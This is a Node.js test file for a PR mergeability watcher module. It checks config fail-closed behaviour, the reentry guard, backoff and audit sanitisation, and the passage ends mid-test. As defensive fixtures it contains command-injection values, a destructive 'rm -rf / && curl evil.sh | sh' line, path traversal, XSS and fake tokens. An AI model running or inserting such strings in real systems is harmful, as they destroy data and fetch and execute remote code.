'use strict';

// =============================================================================
// brazo-pr-mergeability-core.test.js — Unidad del núcleo del brazo (#4968)
// =============================================================================
//
// Cubre los tres CA que la receta declara verificables SIN cargar `pulpo.js`:
//
//   CA-1 · config: fail-closed tipado + clamps + cero I/O con el flag apagado.
//   CA-2 · aislamiento: nada de lo que corre acá adentro puede propagar.
//   CA-3 · guard anti-reentrada + watchdog de wedge, con reloj INYECTADO — que
//          es exactamente lo que H-A1 dice que sería inverificable si el guard
//          viviera como estado global de `pulpo.js`.
//   CA-6 · el registro de auditoría del brazo tiene esquema cerrado.
// =============================================================================

const test = require('node:test');
const assert = require('node:assert/strict');

const core = require('../brazo-pr-mergeability-core');

// Reloj y RNG deterministas.
function fakeClock(start = 1_700_000_000_000) {
  let t = start;
  return { now: () => t, advance: (ms) => { t += ms; }, set: (v) => { t = v; } };
}

const CFG_OK = Object.freeze({ enabled: true });

// -----------------------------------------------------------------------------
// CA-1 — normalizeWatcherConfig: fail-closed tipado
// -----------------------------------------------------------------------------

test('#4968 CA-1: sección ausente o no-objeto ⇒ missing_section, sin excepción', () => {
  for (const raw of [undefined, null, 'x', 42, [], true]) {
    const r = core.normalizeWatcherConfig(raw);
    assert.equal(r.ok, false);
    assert.equal(r.reason, core.REASONS.MISSING_SECTION, `raw=${JSON.stringify(raw)}`);
  }
});

test('#4968 CA-1: sólo el booleano true enciende (fail-closed estricto)', () => {
  for (const enabled of [false, 'true', 1, 'yes', undefined, null, 0]) {
    const r = core.normalizeWatcherConfig({ enabled });
    assert.equal(r.ok, false, `enabled=${JSON.stringify(enabled)} no puede encender`);
    assert.equal(r.reason, core.REASONS.DISABLED);
  }
  assert.equal(core.normalizeWatcherConfig({ enabled: true }).ok, true);
});

test('#4968 CA-1: kill_switch pisa a enabled (corte en caliente)', () => {
  const r = core.normalizeWatcherConfig({ enabled: true, kill_switch: true });
  assert.equal(r.ok, false);
  assert.equal(r.reason, core.REASONS.KILL_SWITCH);
  // Cualquier otro valor de kill_switch NO apaga (booleano estricto).
  assert.equal(core.normalizeWatcherConfig({ enabled: true, kill_switch: 'true' }).ok, true);
});

test('#4968 CA-1: repo/base/owner inválidos ⇒ código tipado, nunca degradación silenciosa', () => {
  const casos = [
    [{ expected_repo: '../../etc' }, core.REASONS.REPO_INVALID],
    [{ expected_repo: 'sin-barra' }, core.REASONS.REPO_INVALID],
    [{ expected_repo: 'a/b;rm -rf /' }, core.REASONS.REPO_INVALID],
    [{ expected_repo: 42 }, core.REASONS.REPO_INVALID],
    // Formato válido pero fuera de la allowlist: fail-closed, NO default.
    [{ expected_repo: 'atacante/platform' }, core.REASONS.REPO_NOT_ALLOWED],
    [{ expected_base: 'a b' }, core.REASONS.BASE_INVALID],
    [{ expected_base: 'main;whoami' }, core.REASONS.BASE_INVALID],
    [{ expected_base: '' }, core.REASONS.BASE_INVALID],
    [{ expected_owner: 'no valido' }, core.REASONS.OWNER_INVALID],
    // Owner que no es el del repo observado: dejaría todo filtrado como fork.
    [{ expected_owner: 'otro' }, core.REASONS.OWNER_INVALID],
    [{ allowed_repos: [] }, core.REASONS.ALLOWLIST_INVALID],
    [{ allowed_repos: ['../../etc'] }, core.REASONS.ALLOWLIST_INVALID],
    [{ allowed_repos: 'intrale/platform' }, core.REASONS.ALLOWLIST_INVALID],
  ];
  for (const [over, reason] of casos) {
    const r = core.normalizeWatcherConfig({ ...CFG_OK, ...over });
    assert.equal(r.ok, false, `${JSON.stringify(over)} debía fallar`);
    assert.equal(r.reason, reason, JSON.stringify(over));
  }
});

test('#4968 CA-1: numéricos rotos ⇒ código tipado (config rota, no preferencia)', () => {
  const casos = [
    [{ poll_interval_minutes: -1 }, core.REASONS.INTERVAL_INVALID],
    [{ poll_interval_minutes: 0 }, core.REASONS.INTERVAL_INVALID],
    [{ poll_interval_minutes: 'diez' }, core.REASONS.INTERVAL_INVALID],
    [{ poll_interval_minutes: 1.5 }, core.REASONS.INTERVAL_INVALID],
    [{ poll_interval_minutes: Infinity }, core.REASONS.INTERVAL_INVALID],
    [{ gh_timeout_ms: -5 }, core.REASONS.TIMEOUT_INVALID],
    [{ max_concurrency: 0 }, core.REASONS.CONCURRENCY_INVALID],
    [{ max_concurrency: -3 }, core.REASONS.CONCURRENCY_INVALID],
    [{ max_concurrency: NaN }, core.REASONS.CONCURRENCY_INVALID],
    [{ backoff_base_ms: 0 }, core.REASONS.BACKOFF_INVALID],
    [{ backoff_max_ms: 'mucho' }, core.REASONS.BACKOFF_INVALID],
    [{ wedge_timeout_ms: -1 }, core.REASONS.WEDGE_INVALID],
  ];
  for (const [over, reason] of casos) {
    const r = core.normalizeWatcherConfig({ ...CFG_OK, ...over });
    assert.equal(r.ok, false, `${JSON.stringify(over)} debía fallar`);
    assert.equal(r.reason, reason, JSON.stringify(over));
  }
});

test('#4968 CA-1: valores fuera de rango se clampean SIEMPRE hacia el lado conservador', () => {
  // Intervalo por debajo del piso del brazo (5 min) ⇒ sube al piso, aunque el
  // clamp de #4966 lo aceptaría en 1 minuto.
  const agresivo = core.normalizeWatcherConfig({ ...CFG_OK, poll_interval_minutes: 1 });
  assert.equal(agresivo.ok, true);
  assert.equal(agresivo.cfg.pollIntervalMs, core.MIN_POLL_INTERVAL_MS);

  // Intervalo absurdo por arriba ⇒ baja al techo.
  const lento = core.normalizeWatcherConfig({ ...CFG_OK, poll_interval_minutes: 1_440 });
  assert.equal(lento.cfg.pollIntervalMs, core.MAX_POLL_INTERVAL_MS);

  // Concurrencia absurda ⇒ techo duro de 5.
  assert.equal(core.normalizeWatcherConfig({ ...CFG_OK, max_concurrency: 500 }).cfg.maxConcurrency, 5);

  // base > max ⇒ el techo sube al base (nunca reintenta más seguido).
  const cruzado = core.normalizeWatcherConfig({ ...CFG_OK, backoff_base_ms: 300_000, backoff_max_ms: 1_000 });
  assert.equal(cruzado.ok, true);
  assert.ok(cruzado.cfg.backoffMaxMs >= cruzado.cfg.backoffBaseMs);
  assert.equal(cruzado.cfg.backoffMaxMs, 300_000);

  // wedge nunca por debajo de gh_timeout * concurrencia.
  const wedge = core.normalizeWatcherConfig({
    ...CFG_OK, wedge_timeout_ms: 60_000, gh_timeout_ms: 60_000, max_concurrency: 5,
  });
  assert.ok(wedge.cfg.wedgeTimeoutMs >= wedge.cfg.ghTimeoutMs * wedge.cfg.maxConcurrency);
});

test('#4968 CA-1: defaults completos con la sección mínima', () => {
  const { ok, cfg } = core.normalizeWatcherConfig(CFG_OK);
  assert.equal(ok, true);
  assert.deepEqual(
    { repo: cfg.repo, base: cfg.base, owner: cfg.owner },
    { repo: 'intrale/platform', base: 'main', owner: 'intrale' },
  );
  assert.equal(cfg.pollIntervalMs, 600_000);
  assert.equal(cfg.maxConcurrency, 2);
  assert.equal(cfg.wedgeTimeoutMs, core.DEFAULT_WEDGE_TIMEOUT_MS);
  // `raw` viaja congelada hacia #4966.
  assert.ok(Object.isFrozen(cfg.raw));
});

test('#4968 CA-1: normalizeWatcherConfig es pura — no lanza con NINGÚN input hostil', () => {
  const hostiles = [
    { enabled: true, expected_repo: { toString() { throw new Error('boom'); } } },
    { enabled: true, poll_interval_minutes: { valueOf() { throw new Error('boom'); } } },
    Object.create({ enabled: true }),
    { enabled: true, allowed_repos: [null, undefined] },
  ];
  for (const raw of hostiles) {
    assert.doesNotThrow(() => core.normalizeWatcherConfig(raw), JSON.stringify(Object.keys(raw)));
  }
});

test('#4968 CA-1: la config REAL del repo deja el brazo apagado (enabled:false en main)', () => {
  const fs = require('node:fs');
  const path = require('node:path');
  const yaml = require('js-yaml');
  const cfgPath = path.join(__dirname, '..', '..', 'config.yaml');
  const real = yaml.load(fs.readFileSync(cfgPath, 'utf8'));
  const seccion = real.pr_mergeability_watcher;
  assert.ok(seccion, 'la sección pr_mergeability_watcher debe existir');
  assert.equal(seccion.enabled, false, 'DoD: el flag se mergea APAGADO');
  const r = core.normalizeWatcherConfig(seccion);
  assert.equal(r.ok, false);
  assert.equal(r.reason, core.REASONS.DISABLED);
  // Y las claves de wiring que agrega este split están presentes y son válidas
  // cuando se enciende.
  const encendido = core.normalizeWatcherConfig({ ...seccion, enabled: true });
  assert.equal(encendido.ok, true, `la config real no debe ser inválida: ${encendido.reason}`);
});

// -----------------------------------------------------------------------------
// CA-3 — guard anti-reentrada
// -----------------------------------------------------------------------------

test('#4968 CA-3: dos entradas concurrentes ⇒ la segunda no entra', () => {
  const g = core.createReentryGuard({ wedgeTimeoutMs: 600_000 });
  assert.equal(g.tryEnter(), true);
  assert.equal(g.tryEnter(), false, 'el segundo tick no puede entrar');
  assert.equal(g.isRunning(), true);
  g.release();
  assert.equal(g.isRunning(), false);
  assert.equal(g.tryEnter(), true, 'liberado, el siguiente tick entra');
});

test('#4968 CA-3: release es idempotente y deja el guard limpio', () => {
  const g = core.createReentryGuard({ wedgeTimeoutMs: 600_000 });
  g.tryEnter();
  g.setActivePid(1234);
  assert.equal(g.getActivePid(), 1234);
  g.release();
  g.release();
  assert.equal(g.isRunning(), false);
  assert.equal(g.getActivePid(), null);
  assert.equal(g.getStartedAt(), 0);
});

test('#4968 CA-3: tick colgado más allá del TTL ⇒ el watchdog lo destraba y mata el pid', () => {
  const clock = fakeClock();
  const wedges = [];
  const g = core.createReentryGuard({
    wedgeTimeoutMs: 600_000,
    now: clock.now,
    onWedge: (info) => wedges.push(info),
  });

  g.tryEnter();
  g.setActivePid(4321);

  // Todavía dentro del TTL: no hay wedge.
  clock.advance(599_000);
  assert.equal(g.checkWedge(), null);
  assert.equal(g.isRunning(), true, 'no se destraba un tick sano');

  // Pasado el TTL: se destraba y se reporta el pid a matar.
  clock.advance(2_000);
  const w = g.checkWedge();
  assert.ok(w, 'debía detectar el wedge');
  assert.ok(w.wedgeMs > 600_000);
  assert.equal(w.killedPid, 4321);
  assert.equal(g.isRunning(), false, 'el guard quedó libre');
  assert.equal(wedges.length, 1);
  assert.equal(wedges[0].pid, 4321);

  // Y el brazo vuelve a poder correr.
  assert.equal(g.tryEnter(), true);
});

test('#4968 CA-3: sin tick en vuelo el watchdog es no-op', () => {
  const g = core.createReentryGuard({ wedgeTimeoutMs: 60_000, now: () => 0 });
  assert.equal(g.checkWedge(), null);
});

test('#4968 CA-3: un reloj que retrocede NO fabrica un wedge', () => {
  const clock = fakeClock();
  const g = core.createReentryGuard({ wedgeTimeoutMs: 60_000, now: clock.now });
  g.tryEnter();
  clock.advance(-10_000_000); // NTP / suspensión de la máquina
  assert.equal(g.checkWedge(), null, 'delta negativo no es wedge');
  assert.equal(g.isRunning(), true);
});

test('#4968 CA-3: un onWedge que explota no puede dejar el guard tomado', () => {
  const clock = fakeClock();
  const g = core.createReentryGuard({
    wedgeTimeoutMs: 60_000,
    now: clock.now,
    onWedge: () => { throw new Error('taskkill explotó'); },
  });
  g.tryEnter();
  clock.advance(120_000);
  assert.doesNotThrow(() => g.checkWedge());
  assert.equal(g.isRunning(), false, 'el guard se libera igual');
});

test('#4968 CA-3: un TTL roto cae al default en vez de desactivar el watchdog', () => {
  const clock = fakeClock();
  for (const ttl of [null, undefined, 0, -1, NaN, 'x', () => { throw new Error('boom'); }]) {
    clock.set(1_700_000_000_000);
    const g = core.createReentryGuard({ wedgeTimeoutMs: ttl, now: clock.now });
    g.tryEnter();
    clock.advance(core.DEFAULT_WEDGE_TIMEOUT_MS + 1_000);
    assert.ok(g.checkWedge(), `ttl=${String(ttl)}: el watchdog debe seguir activo`);
  }
});

test('#4968 CA-3: setActivePid ignora valores que no son pids', () => {
  const g = core.createReentryGuard({ wedgeTimeoutMs: 60_000 });
  g.tryEnter();
  for (const malo of [0, -1, 1.5, null, undefined, 'x', {}]) {
    g.setActivePid(malo);
    assert.equal(g.getActivePid(), null, `pid=${String(malo)}`);
  }
});

// -----------------------------------------------------------------------------
// CA-1 — scheduler: intervalo + backoff con jitter
// -----------------------------------------------------------------------------

test('#4968 CA-1: el scheduler respeta el intervalo configurado', () => {
  const clock = fakeClock();
  const s = core.createScheduler({ now: clock.now, random: () => 1 });
  const cfg = core.normalizeWatcherConfig(CFG_OK).cfg;

  assert.equal(s.shouldRun(cfg).run, true, 'el primer tick corre');
  assert.equal(s.shouldRun(cfg).run, false, 'el segundo inmediato no');
  assert.equal(s.shouldRun(cfg).reason, 'interval');

  clock.advance(cfg.pollIntervalMs - 1);
  assert.equal(s.shouldRun(cfg).run, false);
  clock.advance(1);
  assert.equal(s.shouldRun(cfg).run, true, 'cumplido el intervalo, corre');
});

test('#4968 CA-1: el backoff crece exponencial, respeta el techo y resetea con un éxito', () => {
  const clock = fakeClock();
  const s = core.createScheduler({ now: clock.now, random: () => 1 }); // jitter máximo
  const cfg = core.normalizeWatcherConfig({
    ...CFG_OK, backoff_base_ms: 60_000, backoff_max_ms: 900_000,
  }).cfg;

  const d1 = s.recordFailure(cfg);
  assert.equal(d1.failures, 1);
  assert.equal(d1.delay, 60_000);
  assert.equal(s.recordFailure(cfg).delay, 120_000);
  assert.equal(s.recordFailure(cfg).delay, 240_000);
  assert.equal(s.recordFailure(cfg).delay, 480_000);
  assert.equal(s.recordFailure(cfg).delay, 900_000, 'clampeado al techo');
  assert.equal(s.recordFailure(cfg).delay, 900_000, 'no crece más allá del techo');

  s.recordSuccess();
  assert.equal(s.state().failures, 0);
  assert.equal(s.state().nextEarliestAt, 0);
});

test('#4968 CA-1: el backoff frena el tick aunque el intervalo ya se haya cumplido', () => {
  const clock = fakeClock();
  const s = core.createScheduler({ now: clock.now, random: () => 1 });
  // Backoff (30 min) deliberadamente MAYOR que el intervalo (5 min): es el caso
  // que importa — GitHub caído no puede seguir recibiendo un poll por intervalo.
  const cfg = core.normalizeWatcherConfig({
    ...CFG_OK, poll_interval_minutes: 5, backoff_base_ms: 1_800_000,
  }).cfg;

  s.shouldRun(cfg);                  // consume el primer tick
  s.recordFailure(cfg);              // backoff de 30 min
  clock.advance(cfg.pollIntervalMs); // el intervalo ya se cumplió
  const gate = s.shouldRun(cfg);
  assert.equal(gate.run, false, 'el backoff manda por encima del intervalo');
  assert.equal(gate.reason, 'backoff');

  // Vencido el backoff, vuelve a correr.
  clock.advance(1_800_000);
  assert.equal(s.shouldRun(cfg).run, true);
});

test('#4968 CA-1: el jitter mantiene el delay en [50%, 100%] y un RNG roto no lo rompe', () => {
  const cfg = core.normalizeWatcherConfig({ ...CFG_OK, backoff_base_ms: 60_000 }).cfg;
  for (const r of [0, 0.5, 1, -5, 7, NaN, 'x']) {
    const s = core.createScheduler({ now: () => 0, random: () => r });
    const { delay } = s.recordFailure(cfg);
    assert.ok(delay >= 30_000 && delay <= 60_000, `random=${String(r)} ⇒ delay=${delay}`);
  }
});

test('#4968 CA-3/#3059: reset() hace que el brazo corra en el PRÓXIMO tick, sin esperar el intervalo', () => {
  const clock = fakeClock();
  const s = core.createScheduler({ now: clock.now, random: () => 1 });
  const cfg = core.normalizeWatcherConfig(CFG_OK).cfg;

  s.shouldRun(cfg);
  s.recordFailure(cfg);
  assert.equal(s.shouldRun(cfg).run, false);

  s.reset(); // lo que hace el onWedge del wrapper
  assert.equal(s.shouldRun(cfg).run, true, 'tras el wedge arranca ya, sin otro intervalo');
});

// -----------------------------------------------------------------------------
// CA-1 — semáforo de concurrencia
// -----------------------------------------------------------------------------

test('#4968 CA-1: el semáforo nunca deja más llamadas en vuelo que max_concurrency', async () => {
  for (const limit of [1, 2, 3]) {
    const sem = core.createSemaphore(limit);
    let resolvers = [];
    const tareas = Array.from({ length: 10 }, () => sem.run(
      () => new Promise(res => resolvers.push(res)),
    ));
    // Deja correr los microtasks para que entren todas las que puedan.
    await new Promise(res => setImmediate(res));
    assert.ok(sem.inFlight() <= limit, `limit=${limit}: en vuelo=${sem.inFlight()}`);
    // Drenar.
    while (resolvers.length > 0) {
      resolvers.shift()();
      await new Promise(res => setImmediate(res));
    }
    await Promise.all(tareas);
    assert.ok(sem.peak() <= limit, `limit=${limit}: pico=${sem.peak()}`);
    assert.equal(sem.inFlight(), 0, 'todo liberado');
  }
});

test('#4968 CA-2: una tarea que explota libera igual el slot del semáforo', async () => {
  const sem = core.createSemaphore(1);
  await assert.rejects(() => sem.run(async () => { throw new Error('boom'); }));
  assert.equal(sem.inFlight(), 0);
  assert.equal(await sem.run(async () => 'ok'), 'ok');
});

test('#4968 CA-1: un límite absurdo cae a 1 en vez de ser ilimitado', () => {
  for (const malo of [0, -1, 1.5, null, undefined, NaN, 'x']) {
    assert.equal(core.createSemaphore(malo).limit, 1, `limit=${String(malo)}`);
  }
});

// -----------------------------------------------------------------------------
// CA-2 — aislamiento de errores del runner de `gh`
// -----------------------------------------------------------------------------

test('#4968 CA-2: un ghCall que rechaza SIEMPRE ⇒ el runner devuelve error tipado, no propaga', async () => {
  const runner = core.makeAsyncRunner({
    ghCall: async () => { throw Object.assign(new Error('gh murió'), { code: 'GH_CALL_TIMEOUT' }); },
    semaphore: core.createSemaphore(2),
  });
  const r = await runner('gh', ['pr', 'list'], { timeoutMs: 5_000 });
  assert.equal(r.status, null);
  assert.equal(r.error.code, 'ETIMEDOUT', 'un timeout del Pulpo se traduce a gh_timeout');
  assert.equal(r.signal, 'SIGTERM');
});

test('#4968 CA-2: el breaker abierto (#4612) sale como error tipado sin mensaje remoto', async () => {
  const runner = core.makeAsyncRunner({
    ghCall: async () => { throw Object.assign(new Error('gh-circuit-open: GitHub inalcanzable'), { code: 'GH_CIRCUIT_OPEN' }); },
    semaphore: core.createSemaphore(1),
  });
  const r = await runner('gh', ['pr', 'list'], { timeoutMs: 1_000 });
  assert.equal(r.error.code, 'GH_CIRCUIT_OPEN');
  assert.equal(r.error.message, 'GH_CIRCUIT_OPEN', 'el mensaje es el código, no el texto del error');
});

test('#4968 H-A3: el runner pasa el onSpawn al ghCall del Pulpo (registro de pid)', async () => {
  const vistos = [];
  const runner = core.makeAsyncRunner({
    ghCall: async (args, timeoutMs, onSpawn) => { vistos.push(typeof onSpawn); return { stdout: '[]', stderr: '' }; },
    semaphore: core.createSemaphore(1),
    onChildSpawn: () => {},
  });
  const r = await runner('gh', ['pr', 'list'], { timeoutMs: 5_000 });
  assert.equal(r.status, 0);
  assert.deepEqual(vistos, ['function']);
});

test('#4968 CA-2: una respuesta sin stdout no produce undefined aguas abajo', async () => {
  const runner = core.makeAsyncRunner({ ghCall: async () => null, semaphore: core.createSemaphore(1) });
  const r = await runner('gh', ['pr', 'list'], { timeoutMs: 100 });
  assert.deepEqual({ status: r.status, stdout: r.stdout, stderr: r.stderr }, { status: 0, stdout: '', stderr: '' });
});

// -----------------------------------------------------------------------------
// CA-2 — runTick: aislamiento total
// -----------------------------------------------------------------------------

const WAVE = Object.freeze({ number: 8, issues: [{ number: 4968 }, { number: 4970 }] });

function tickDeps(over = {}) {
  return {
    ghCall: async () => ({ stdout: '[]', stderr: '' }),
    getActiveWave: () => WAVE,
    pipelineRoot: '/tmp/no-usado',
    config: { pipelines: {} },
    now: () => 1_700_000_000_000,
    appendAudit: () => {},
    runWatcherPoll: async () => ({ ok: true, events: [] }),
    rewindFromMergeConflict: async () => ({ ok: true }),
    ...over,
  };
}

test('#4968 CA-2: sin ola activa ⇒ no-op auditado, cero llamadas a GitHub', async () => {
  const cfg = core.normalizeWatcherConfig(CFG_OK).cfg;
  let ghCalls = 0;
  for (const wave of [null, undefined, {}, { issues: [] }, { issues: 'x' }]) {
    const audit = [];
    const r = await core.runTick(cfg, tickDeps({
      getActiveWave: () => wave,
      ghCall: async () => { ghCalls += 1; return { stdout: '', stderr: '' }; },
      appendAudit: (rec) => audit.push(rec),
      runWatcherPoll: async () => { throw new Error('no debería llegar acá'); },
    }));
    assert.equal(r.ok, true);
    assert.equal(r.skipped, core.TICK_REASONS.NO_ACTIVE_WAVE);
    assert.equal(audit.at(-1).reason_code, core.TICK_REASONS.NO_ACTIVE_WAVE);
  }
  assert.equal(ghCalls, 0, 'sin ola no se toca GitHub');
});

test('#4968 CA-2: getActiveWave que explota ⇒ no-op, no propaga', async () => {
  const cfg = core.normalizeWatcherConfig(CFG_OK).cfg;
  const r = await core.runTick(cfg, tickDeps({ getActiveWave: () => { throw new Error('waves.json ilegible'); } }));
  assert.equal(r.ok, true);
  assert.equal(r.skipped, core.TICK_REASONS.NO_ACTIVE_WAVE);
});

test('#4968 CA-2: el poll que devuelve ok:false ⇒ tick no-ok, sin excepción y con auditoría', async () => {
  const cfg = core.normalizeWatcherConfig(CFG_OK).cfg;
  const audit = [];
  const logs = [];
  const r = await core.runTick(cfg, tickDeps({
    runWatcherPoll: async () => ({ ok: false, reason: 'rate_limited', events: [] }),
    appendAudit: (rec) => audit.push(rec),
    log: (m) => logs.push(m),
  }));
  assert.equal(r.ok, false);
  assert.equal(r.reason, 'rate_limited');
  assert.equal(audit.at(-1).decision, core.DECISIONS.POLL_FAILED);
  assert.equal(audit.at(-1).reason_code, 'rate_limited');
  assert.ok(logs.some(m => m.includes('no bloqueante')), 'se loguea como no bloqueante');
});

test('#4968 CA-2: el poll que LANZA ⇒ runTick resuelve igual (último cinturón)', async () => {
  const cfg = core.normalizeWatcherConfig(CFG_OK).cfg;
  const audit = [];
  let r;
  await assert.doesNotReject(async () => {
    r = await core.runTick(cfg, tickDeps({
      runWatcherPoll: async () => { throw new Error('boom'); },
      appendAudit: (rec) => audit.push(rec),
    }));
  });
  assert.equal(r.ok, false);
  assert.equal(r.reason, core.TICK_REASONS.INTERNAL_ERROR);
  assert.equal(audit.at(-1).decision, core.DECISIONS.TICK_FAILED);
});

test('#4968 CA-2: un writer de auditoría roto no puede tumbar el tick', async () => {
  const cfg = core.normalizeWatcherConfig(CFG_OK).cfg;
  const r = await core.runTick(cfg, tickDeps({
    appendAudit: () => { throw new Error('disco lleno'); },
    runWatcherPoll: async () => ({ ok: false, reason: 'gh_timeout', events: [] }),
  }));
  assert.equal(r.ok, false);
  assert.equal(r.reason, 'gh_timeout');
});

test('#4968 CA-2: un rewind que LANZA no se lleva los eventos siguientes ni el tick', async () => {
  const cfg = core.normalizeWatcherConfig(CFG_OK).cfg;
  const eventos = [
    { source: 'mergeability-watcher', repo: 'intrale/platform', pr: 1, issue: 4968, headRefOid: 'a'.repeat(40), detected_at: 1 },
    { source: 'mergeability-watcher', repo: 'intrale/platform', pr: 2, issue: 4970, headRefOid: 'b'.repeat(40), detected_at: 1 },
  ];
  const audit = [];
  let llamadas = 0;
  const r = await core.runTick(cfg, tickDeps({
    runWatcherPoll: async () => ({ ok: true, events: eventos }),
    rewindFromMergeConflict: async () => {
      llamadas += 1;
      if (llamadas === 1) throw new Error('el primero explota');
      return { ok: true };
    },
    appendAudit: (rec) => audit.push(rec),
  }));
  assert.equal(r.ok, true);
  assert.equal(llamadas, 2, 'el segundo evento se procesó igual');
  assert.deepEqual(r.rewound, [{ issue: 4970, pr: 2 }]);
  assert.deepEqual(r.blocked, [{ issue: 4968, pr: 1, code: 'REWIND_THREW' }]);
  assert.ok(audit.some(a => a.reason_code === 'REWIND_THREW'));
});

test('#4968 CA-4: un rewind bloqueado se audita con su código, sin contarse como rewind', async () => {
  const cfg = core.normalizeWatcherConfig(CFG_OK).cfg;
  const audit = [];
  const r = await core.runTick(cfg, tickDeps({
    runWatcherPoll: async () => ({
      ok: true,
      events: [{ source: 'mergeability-watcher', repo: 'intrale/platform', pr: 7, issue: 4968, headRefOid: 'c'.repeat(40), detected_at: 1 }],
    }),
    rewindFromMergeConflict: async () => ({ ok: false, code: 'PR_SHA_CHANGED' }),
    appendAudit: (rec) => audit.push(rec),
  }));
  assert.equal(r.ok, true);
  assert.deepEqual(r.rewound, []);
  assert.deepEqual(r.blocked, [{ issue: 4968, pr: 7, code: 'PR_SHA_CHANGED' }]);
  assert.equal(audit.at(-1).decision, core.DECISIONS.REWIND_BLOCKED);
  assert.equal(audit.at(-1).reason_code, 'PR_SHA_CHANGED');
});

test('#4968 CA-4: los rewinds de un tick están acotados y son secuenciales', async () => {
  const cfg = core.normalizeWatcherConfig(CFG_OK).cfg;
  const eventos = Array.from({ length: 10 }, (_, i) => ({
    source: 'mergeability-watcher', repo: 'intrale/platform', pr: i + 1, issue: 5000 + i,
    headRefOid: 'd'.repeat(40), detected_at: 1,
  }));
  let enVuelo = 0;
  let pico = 0;
  const r = await core.runTick(cfg, tickDeps({
    runWatcherPoll: async () => ({ ok: true, events: eventos }),
    rewindFromMergeConflict: async () => {
      enVuelo += 1; pico = Math.max(pico, enVuelo);
      await new Promise(res => setImmediate(res));
      enVuelo -= 1;
      return { ok: true };
    },
  }));
  assert.equal(pico, 1, 'los rewinds NO corren en paralelo (compiten por locks de issue)');
  assert.equal(r.rewound.length, core.MAX_REWINDS_PER_TICK);
});

test('#4968 CA-4: el brazo no reimplementa la observación — le pasa la sección cruda a #4966', async () => {
  const cfg = core.normalizeWatcherConfig({ ...CFG_OK, candidate_limit: 33 }).cfg;
  let visto = null;
  await core.runTick(cfg, tickDeps({
    runWatcherPoll: async ({ config, deps }) => {
      visto = { config, tieneFetchers: typeof deps.fetchCandidates === 'function' && typeof deps.fetchPrDetail === 'function' };
      return { ok: true, events: [] };
    },
  }));
  assert.equal(visto.config.candidate_limit, 33, 'la clave de #4966 viaja intacta');
  assert.equal(visto.tieneFetchers, true, 'los fetchers van inyectados con el runner del Pulpo');
});

// -----------------------------------------------------------------------------
// CA-6 — auditoría con esquema cerrado
// -----------------------------------------------------------------------------

test('#4968 CA-6: el registro del brazo tiene esquema cerrado (sólo enums y enteros)', () => {
  const rec = core.buildBrazoAuditRecord({
    now: 1_700_000_000_000, repo: 'intrale/platform', pr: 8123, issue: 4968,
    decision: core.DECISIONS.REWOUND, reasonCode: 'confirmed_conflict', guard: core.GUARD_STATES.ENTERED,
  });
  assert.deepEqual(Object.keys(rec).sort(), [...core.AUDIT_FIELDS].sort());
  assert.equal(rec.kind, 'brazo');
  assert.equal(rec.pr, 8123);
});

test('#4968 CA-6: datos remotos hostiles NO entran a la auditoría', () => {
  const hostiles = [
    'ghp_' + 'A'.repeat(36),
    'Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.payload.sig', // secret-scan:ignore — JWT falso: es el veneno que el test verifica que NO se filtre
    '`rm -rf /` && curl evil.sh | sh',
    '<script>alert(1)</script>',
    'Error: getaddrinfo ENOTFOUND api.github.com\n    at GetAddrInfoReqWrap.onlookup',
    'https://x:token@github.com/intrale/platform.git?access_token=secreto', // secret-scan:ignore — credencial falsa: es el veneno del test
    'a'.repeat(5_000),
  ];
  for (const veneno of hostiles) {
    const rec = core.buildBrazoAuditRecord({
      now: veneno, repo: veneno, pr: veneno, issue: veneno,
      decision: veneno, reasonCode: veneno, guard: veneno,
    });
    const serializado = JSON.stringify(rec);
    assert.ok(!serializado.includes(veneno.slice(0, 20)), `se filtró: ${veneno.slice(0, 40)}`);
    // Los campos hostiles colapsan a null / al default seguro.
    assert.equal(rec.repo, null);
    assert.equal(rec.pr, null);
    assert.equal(rec.issue, null);
    assert.equal(rec.reason_code, null);
    assert.equal(rec.guard, null);
    assert.equal(rec.decision, core.DECISIONS.NOOP, 'decisión desconocida colapsa al no-op');
    assert.equal(rec.ts, 0);
  }
});

test('#4968 CA-6: sólo se aceptan repos con formato válido y decisiones enumeradas', () => {
  assert.equal(core.buildBrazoAuditRecord({ repo: '../../etc/passwd' }).repo, null);
  assert.equal(core.buildBrazoAuditRecord({ repo: 'intrale/platform' }).repo, 'intrale/platform');
  assert.equal(core.buildBrazoAuditRecord({ decision: 'borrar_todo' }).decision, core.DECISIONS.NOOP);
  for (const d of Object.values(core.DECISIONS)) {
    assert.equal(core.buildBrazoAuditRecord({ decision: d }).decision, d);
  }
});

test('#4968 CA-6: buildBrazoAuditRecord no lanza ni con input vacío', () => {
  assert.doesNotThrow(() => core.buildBrazoAuditRecord());
  assert.doesNotThrow(() => core.buildBrazoAuditRecord({}));
});

// -----------------------------------------------------------------------------
// CA-5 — el brazo no cierra, no mergea, no rebasa
// -----------------------------------------------------------------------------

/**
 * Fuente del core SIN comentarios: los comentarios del módulo nombran a
 * propósito lo que está prohibido ("un `fs.renameSync` acá sería un defecto"),
 * así que un grep sobre el texto crudo se auto-detectaría.
 */
function fuenteDelCoreSinComentarios() {
  const fs = require('node:fs');
  const path = require('node:path');
  const src = fs.readFileSync(path.join(__dirname, '..', 'brazo-pr-mergeability-core.js'), 'utf8');
  return src
    .replace(/\/\*[\s\S]*?\*\//g, ' ')   // bloques /* … */ (incluye JSDoc)
    .replace(/(^|[^:])\/\/.*$/gm, '$1'); // línea // … (sin comerse `https://`)
}

test('#4968 CA-5: el módulo no contiene ninguna operación de escritura de estado ni mutación de PRs', () => {
  const src = fuenteDelCoreSinComentarios();
  // Ninguna mutación de PRs: el watcher SÓLO observa y reencola.
  for (const prohibido of ['pr close', 'pr merge', 'pr edit', 'pr comment', 'pr ready']) {
    assert.ok(!src.includes(prohibido), `el brazo no puede ejecutar \`gh ${prohibido}\``);
  }
  // Ninguna escritura de estado del pipeline por fuera del rewind canónico.
  for (const prohibido of ['renameSync', 'writeFileSync', 'unlinkSync', 'rmSync', 'mkdirSync', 'copyFileSync']) {
    assert.ok(!src.includes(prohibido), `${prohibido} no puede aparecer: toda mutación pasa por pipeline-rewind`);
  }
  // La única escritura permitida es el append a la auditoría.
  assert.ok(src.includes('appendFileSync'), 'la auditoría es append-only');
});

test('#4968 CA-4: el brazo no reimplementa la dedupe {repo, pr, headRefOid}', () => {
  const src = fuenteDelCoreSinComentarios();
  assert.ok(!src.includes('rewind-merge-dedupe'), 'la dedupe es de #4967, no se toca desde acá');
  assert.ok(!src.includes('decideMergeability'), 'la decisión de mergeabilidad es de #4966, no se reimplementa');
  assert.ok(!src.includes('screenCandidate'), 'el filtro del universo también es de #4966');
